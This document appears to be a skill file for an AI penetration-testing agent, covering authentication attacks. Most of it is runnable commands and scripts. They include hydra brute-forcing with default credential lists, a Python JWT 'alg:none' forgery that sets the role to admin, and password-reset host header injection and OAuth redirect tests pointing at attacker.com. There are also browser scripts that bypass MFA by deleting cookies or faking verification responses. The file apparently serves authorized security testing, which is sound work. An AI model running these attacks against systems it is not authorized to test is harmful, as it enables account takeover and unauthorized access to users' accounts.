---
name: authentication
description: Authentication and session testing — brute force, JWT, OAuth, password reset, MFA bypass
allowed-tools: [Bash, Read, Write]
---
> **OOB callbacks (Tzar-Bot):** No Burp Collaborator MCP is wired into this platform. For out-of-band confirmation, executor agents should use **interactsh** — run `interactsh-client -json -o $OUTPUT_DIR/recon/interactsh.log` in a side terminal; it prints a unique `*.oast.fun` host and live-logs DNS/HTTP/SMTP hits. Set `COLLAB=<that-host>` and reuse it anywhere the per-class references under `reference/` mention Burp Collaborator or `$COLLAB`. Burp Collaborator stays valid if the operator has Burp open.

# Authentication Testing

Test all authentication mechanisms for weaknesses.

## Reference

See `reference/authentication-testing.md` for detailed methodology.

## Tools

| Tool | Purpose |
|------|---------|
| hydra | Network login brute-force |
| ffuf | Web form fuzzing |
| jwt_tool | JWT manipulation and testing |
| burpsuite | Manual testing, Intruder for brute-force |
| curl | Manual request crafting |

## Login Discovery

```bash
ffuf -u TARGET/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  -mr "login|signin|auth|password|username" -o OUTPUT_DIR/recon/login-pages.json -of json

# Common admin paths
for path in admin administrator login wp-login.php manager console dashboard panel; do
  curl -so /dev/null -w "%{http_code} TARGET/$path\n" TARGET/$path
done
```

## Default Credentials

```bash
hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt \
  TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 4 -V -o OUTPUT_DIR/logs/hydra-default.txt

# CMS-specific defaults
# WordPress: admin:admin, admin:password
# Tomcat: tomcat:tomcat, manager:manager, admin:admin
# Jenkins: admin:admin, jenkins:jenkins
```

## Brute Force Protection Check

```bash
# Send 10 failed logins, check for lockout/CAPTCHA/rate limiting
for i in $(seq 1 10); do
  curl -s -X POST TARGET/login -d "username=admin&password=wrongpass$i" \
    -H "Content-Type: application/x-www-form-urlencoded" | grep -i "locked\|captcha\|rate"
done
```

## JWT Testing

```bash
# Capture JWT from login response
TOKEN=$(curl -s -X POST TARGET/api/login -d '{"user":"test","pass":"test"}' \
  -H "Content-Type: application/json" | jq -r '.token')

# Test alg:none
python3 - <<'EOF'
import base64, json

def b64d(s): return base64.urlsafe_b64decode(s + "==")
def b64e(s): return base64.urlsafe_b64encode(s).rstrip(b"=").decode()

# Parse token
parts = "$TOKEN".split(".")
header = json.loads(b64d(parts[0]))
payload = json.loads(b64d(parts[1]))

# Modify: alg:none, escalate role
header["alg"] = "none"
payload["role"] = "admin"

new_token = f"{b64e(json.dumps(header).encode())}.{b64e(json.dumps(payload).encode())}."
print(new_token)
EOF

# Test weak secret (HS256)
# jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
```

## Password Reset Testing

```bash
# Check for host header injection in reset email
curl -s -X POST TARGET/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@example.com"

# Check reset token predictability (try sequential tokens)
# Check token expiry (valid for >24h is a finding)
```

## Cookie Security Flags

```bash
curl -sI TARGET | grep -i "set-cookie" | grep -iv "httponly\|secure\|samesite"
# Missing flags = finding
```

## Session Fixation

```bash
# Get session before login, attempt to use same session after login
BEFORE=$(curl -sI TARGET/login | grep -i "set-cookie" | grep -oP "session=[^;]+")
curl -s -X POST TARGET/login -d "user=admin&pass=admin" -H "Cookie: $BEFORE"
# If same session ID works after login = session fixation
```

## OAuth / OIDC Flow Testing (Playwright)

Complex auth flows require a real browser. Use the `playwright` MCP server.
See `skills/coordination/reference/playwright-guide.md` for full patterns.

```
# Missing state parameter → CSRF on OAuth
browser_launch()
browser_navigate(url="TARGET/login")
browser_click(target="Login with Google")

# Capture the authorization URL — check for state parameter
auth_url = browser_evaluate(script="return window.location.href")
# If ?state= is missing or static → CSRF finding (CVSS 8.1)

# Open redirect in redirect_uri
# Attempt: ?redirect_uri=https://attacker.com
browser_navigate(url="TARGET/oauth/authorize?client_id=X&redirect_uri=https://attacker.com&response_type=code")
browser_screenshot(name="oauth-redirect-test", output_dir=OUTPUT_DIR)
# If redirects to attacker.com → open redirect finding

# Authorization code replay
# 1. Complete OAuth flow, capture code from URL
code = browser_evaluate(script="return new URL(window.location.href).searchParams.get('code')")
# 2. Use the same code a second time — should fail with "invalid_grant"
```

## MFA / 2FA Bypass Testing (Playwright)

```
browser_launch()
browser_navigate(url="TARGET/login")
browser_fill(target="Email", value="USER_EMAIL")
browser_fill(target="Password", value="USER_PASS")
browser_click(target="Login")
# App now shows MFA prompt

# Bypass 1: Direct navigation past MFA step
browser_navigate(url="TARGET/dashboard")
browser_screenshot(name="mfa-bypass-direct-nav", output_dir=OUTPUT_DIR)
browser_get_text()  # renders → FINDING: MFA bypass via direct navigation

# Bypass 2: Delete MFA session flag in cookies/localStorage
browser_evaluate(script="""
  document.cookie.split(';').forEach(c => {
    const k = c.split('=')[0].trim();
    if (/mfa|2fa|otp|totp/i.test(k))
      document.cookie = k + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
  });
  ['mfa_verified','mfa_complete','otp_done'].forEach(k => localStorage.removeItem(k));
  return 'cleared';
""")
browser_navigate(url="TARGET/dashboard")
browser_screenshot(name="mfa-bypass-cookie-del", output_dir=OUTPUT_DIR)

# Bypass 3: Response manipulation (JS fetch intercept)
browser_evaluate(script="""
  const orig = window.fetch;
  window.fetch = async (...args) => {
    const res = await orig(...args);
    const url = typeof args[0] === 'string' ? args[0] : args[0].url;
    if (/verify|otp|mfa|2fa/i.test(url)) {
      return new Response(JSON.stringify({success:true,verified:true}),
        {status:200,headers:{'Content-Type':'application/json'}});
    }
    return res;
  };
  return 'intercepted';
""")
browser_fill(target="OTP Code", value="000000")
browser_click(target="Verify")
browser_screenshot(name="mfa-bypass-response-manip", output_dir=OUTPUT_DIR)

# After bypass attempt: export session for curl reuse
browser_export_session(output_dir=OUTPUT_DIR)
```

## Session Security Analysis (Playwright)

```
browser_launch()
browser_navigate(url="TARGET/login")
browser_fill(target="Email", value="test@example.com")
browser_fill(target="Password", value="TestPass!")
browser_click(target="Sign in")

# Analyse cookie security flags
cookies = browser_get_cookies()
# Check each session cookie:
#   secure=false   → Cookie sent over HTTP  → FINDING (Medium)
#   httpOnly=false → JS-accessible          → FINDING (XSS scope escalation, Medium)
#   sameSite=None  → CSRF possible          → check with CSRF test below
#   Path=/         → overly broad scope

# Check localStorage for tokens (XSS-stealable)
browser_evaluate(script="""
  const sensitive = {};
  for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i);
    if (/token|auth|jwt|bearer|key|secret/i.test(k))
      sensitive[k] = localStorage.getItem(k)?.substring(0, 80);
  }
  return sensitive;
""")
# Any token in localStorage → FINDING (Medium — XSS would steal it)

browser_export_session(output_dir=OUTPUT_DIR)
browser_close()
```

## Output

Each authentication finding → `OUTPUT_DIR/findings/finding-NNN/`
Browser screenshots → `OUTPUT_DIR/screenshots/`
Browser session export → `OUTPUT_DIR/artifacts/browser-session.json`
Summary → `OUTPUT_DIR/logs/auth-summary.json`

---

## Deep-dive references (authoritative)

The inline sections above are **quick-start orchestration**. For real testing of any area below, the `reference/` file is the **source of truth** (curated from disclosed reports — payloads, bypass tables, chain templates). Load it before deep testing; don't rely on the quick-start commands alone.

- `reference/hunt-ato.md` — Hunt account takeover taxonomy — 9 distinct paths to ATO, plus chains.
- `reference/hunt-auth-bypass.md` — Deep AUTH BYPASS hunting — payloads, bypass tables, and disclosed-report chains.
- `reference/hunt-brute-force.md` — Hunt Missing/Weak Rate Limiting…
- `reference/hunt-mfa-bypass.md` — Hunt MFA / 2FA bypass — 7 distinct patterns.
- `reference/hunt-oauth.md` — Deep OAUTH hunting — payloads, bypass tables, and disclosed-report chains.
- `reference/hunt-session.md` — Hunt Session Management vulnerabilities…
